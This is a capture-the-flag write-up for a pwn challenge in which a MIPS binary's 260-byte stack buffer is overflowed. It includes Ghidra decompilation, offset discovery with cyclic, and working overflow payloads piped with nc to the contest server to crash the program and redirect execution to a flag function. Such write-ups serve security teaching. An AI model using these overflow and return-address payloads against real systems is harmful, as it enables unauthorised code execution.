# STOP GAN
Category: Pwn

## Description
> Success, you've gotten the picture of your lost love, not knowing that pictures and the things you take pictures of are generally two seperate things, you think you've rescue them and their brethren by downloading them all to your ships hard drive. They're still being eaten, but this is a fact that has escaped you entirely. Your thoughts swiftly shift to revenge. It's important now to stop this program from destroying these "Cauliflowers" as they're referred to, ever again.

A C file was attached:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/**
 * 6e: bufferflow triggering segfault  - binary, compile with:
 * gcc /tmp/console.c -o /tmp/console -static -s
 *
 * Console allows the player to get info on the binary.
 * Crashing bof will trigger the 1st flag.
 * Controlling the buffer overflow in bof will trigger the 2nd flag.
 */

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  char inputs[256];
  printf("Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.\n Bonus flag for controlling the crash.\n");
  while(1) {
    printf("\nConsole commands: \nrun\nquit\n>>");
    if (fgets(inputs, 256, stdin) == NULL) {
      exit(0);
    }
    printf("Inputs: %s", inputs);
    if ( strncmp(inputs, "run\n\0", 256) == 0 ) {
      int result = system("/usr/bin/qemu-mipsel-static ./bof");
      continue;
    } else if ( strncmp(inputs, "quit\n\0", 256) == 0 ) {
      exit(0);
    } else {
      puts("Unable to determine action from your input");
      exit(0);
    }
  }
  return 0;
}
```

A binary file was attached as well.

## Solution

Let's compile `console.c` according to the instructions and run it:

```console
root@kali:/media/sf_CTFs/google/STOP_GAN# ./console
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>run
Inputs: run
Cauliflower systems never crash >>
test

Console commands:
run
quit
```

`console` is a wrapper for `bof`, allowing us to call it in a loop even if we're able to crash it.

`bof` is a MIPS binary, which needs to be run with the help of an emulator (qemu):
```console
root@kali:/media/sf_CTFs/google/STOP_GAN# file bof
bof: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a31c48679f10dc6945e7b5e3a88b979bebe752e3, not stripped
```

Let's take a quick look at `bof` with Ghidra's decompiler. The main function is very simple:

```c
undefined4 main(void)

{
  __sighandler_t p_Var1;
  undefined4 uVar2;
  undefined auStack268 [260];
  
  p_Var1 = signal(0xb,write_out);
  if (p_Var1 == (__sighandler_t)0xffffffff) {
    printf("An error occurred setting a signal handler.");
    uVar2 = 0xffffffff;
  }
  else {
    puts("Cauliflower systems never crash >>");
    __isoc99_scanf(&UNK_004754f4,auStack268);
    if (false) {
      local_flag();
    }
    uVar2 = 0;
  }
  return uVar2;
}
```

We see there's a buffer of 260 bytes, which the program reads into using `scanf`. We can easily overflow this buffer.

### Uncontrolled Crash

We just overrun the buffer with >260 bytes to get the first flag:

```console
root@kali:/media/sf_CTFs/google/STOP_GAN# { echo "run"; python -c "print 'a'*300";} | nc buffer-overflow.ctfcompetition.com 1337
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>Inputs: run
CTF{Why_does_cauliflower_threaten_us}
Cauliflower systems never crash >>
segfault detected! ***CRASH***
Console commands:
run
quit
```

What happens here is that the signal handler, which was registered to handle a segmentation fault with `signal(0xb,write_out);`, gets called and outputs the flag:
```c
void write_out(void)
{
  printf("segfault detected! ***CRASH***");
  print_file("flag0");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

### Controlled Crash

It looks like we'd like to jump to:
```c
void local_flag(void)
{
  print_file("flag1");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

This function starts at:
```assembly
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined local_flag()
                               assume gp = 0x4a8970
                               assume t9 = 0x400840
             undefined         v0:1            <RETURN>
             undefined4        Stack[-0x4]:4   local_4                                 XREF[1]:     00400850(W)  
             undefined4        Stack[-0x8]:4   local_8                                 XREF[1]:     00400854(W)  
             undefined4        Stack[-0x10]:4  local_10                                XREF[1]:     0040085c(W)  
                             local_flag                                      XREF[1]:     main:004009e0(c)  
        00400840 0b 00 1c 3c     lui        gp,0xb
             assume t9 = <UNKNOWN>
             assume gp = <UNKNOWN>
        00400844 30 81 9c 27     addiu      gp,gp,-0x7ed0
        00400848 21 e0 99 03     addu       gp,gp,t9
        0040084c e0 ff bd 27     addiu      sp,sp,-0x20
        00400850 1c 00 bf af     sw         ra,local_4(sp)
        00400854 18 00 be af     sw         s8,local_8(sp)
        00400858 25 f0 a0 03     or         s8,sp,zero
        0040085c 10 00 bc af     sw         gp=>_gp,local_10(sp)
        00400860 34 80 82 8f     lw         v0,-0x7fcc(gp)=>PTR_LAB_004a09a4                                               = 00470000
        00400864 74 54 44 24     addiu      a0=>s_flag1_00475474,v0,0x5474                                                 = "flag1"
        00400868 30 80 82 8f     lw         v0,-0x7fd0(gp)=>->__ehdr_start                                                 = 00400000
        0040086c 30 07 42 24     addiu      v0,v0,0x730
        00400870 25 c8 40 00     or         t9,v0,zero
        00400874 ae ff 11 04     bal        print_file                                                                     undefined print_file()
```

In order to discover the exact overflow offset, we run `bof` with the built-in `qemu` functionality of `strace`. Note that using the default alphabet of `cyclic` was giving an incorrect result for some reason, so we're using a non-standard one:
```console
root@kali:/media/sf_CTFs/google/STOP_GAN# cyclic -a "ABCDE" 300 |  qemu-mipsel-static -strace ./bof
3161 uname(0x7ffff258) = 0
3161 brk(NULL) = 0x004a3000
3161 brk(0x004a3cc8) = 0x004a3cc8
3161 set_thread_area(0x004aa490) = 0
3161 readlink("/proc/self/exe",0x7fffe3a8,4096) = 34
3161 brk(0x004c4cc8) = 0x004c4cc8
3161 brk(0x004c5000) = 0x004c5000
3161 access("/etc/ld.so.nohwcap",F_OK) = -1 errno=2 (No such file or directory)
3161 rt_sigaction(SIGSEGV,0x7ffff1a0,0x7ffff180) = 0
3161 fstat64(1,0x7ffff198) = 0
3161 write(1,0x4a4780,35)Cauliflower systems never crash >>
 = 35
3161 fstat64(0,0x7fffeb70) = 0
3161 read(0,0x4a4b88,4096) = 300
3161 read(0,0x4a4b88,4096) = 0
--- SIGSEGV {si_signo=SIGSEGV, si_code=1, si_addr=0x41444344} ---
3161 open("flag0",O_RDONLY) = 3
3161 read(3,0x7ffff16c,1) = 1
3161 write(1,0x7ffff16c,1)f = 1
3161 read(3,0x7ffff16c,1) = 1
3161 write(1,0x7ffff16c,1)l = 1
3161 read(3,0x7ffff16c,1) = 1
3161 write(1,0x7ffff16c,1)a = 1
3161 read(3,0x7ffff16c,1) = 1
3161 write(1,0x7ffff16c,1)g = 1
3161 read(3,0x7ffff16c,1) = 1
3161 write(1,0x7ffff16c,1)1 = 1
3161 read(3,0x7ffff16c,1) = 1
3161 write(1,0x7ffff16c,1)2 = 1
3161 read(3,0x7ffff16c,1) = 1
3161 write(1,0x7ffff16c,1)3 = 1
3161 read(3,0x7ffff16c,1) = 1
3161 write(1,0x7ffff16c,1)
 = 1
3161 read(3,0x7ffff16c,1) = 0
3161 close(3) = 0
3161 write(1,0x4a4780,30)segfault detected! ***CRASH*** = 30
3161 exit_group(0)
```

We can see the `SIGSEGV` here:
```
--- SIGSEGV {si_signo=SIGSEGV, si_code=1, si_addr=0x41444344} ---
```

We enter this as the search parameter for `cyclic` and get the overflow offset:
```console
root@kali:/media/sf_CTFs/google/STOP_GAN# cyclic -a "ABCDE" -l 0x41444344
264
```

Now we would expect this to work, but it doesn't:
```console
root@kali:/media/sf_CTFs/google/STOP_GAN# python -c "print ('a'*264 + '\x40\x08\x40\x00');" | ./bof
Cauliflower systems never crash >>
flag for uncontrolled overflow
segfault detected! ***CRASH***
```

Moving forward with the addresses eventually works:
```console
root@kali:/media/sf_CTFs/google/STOP_GAN# python -c "print ('a'*264 + '\x4c\x08\x40\x00');" | ./bof
Cauliflower systems never crash >>
flag for controlled overflow
```

We try it on the server and get:
```console
root@kali:/media/sf_CTFs/google/STOP_GAN# { echo "run"; python -c "print ('a'*264 + '\x4c\x08\x40\x00');";} | nc buffer-overflow.ctfcompetition.com 1337
Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.
 Bonus flag for controlling the crash.

Console commands:
run
quit
>>Inputs: run
CTF{controlled_crash_causes_conditional_correspondence}
Cauliflower systems never crash >>

Console commands:
run
quit
>>
```


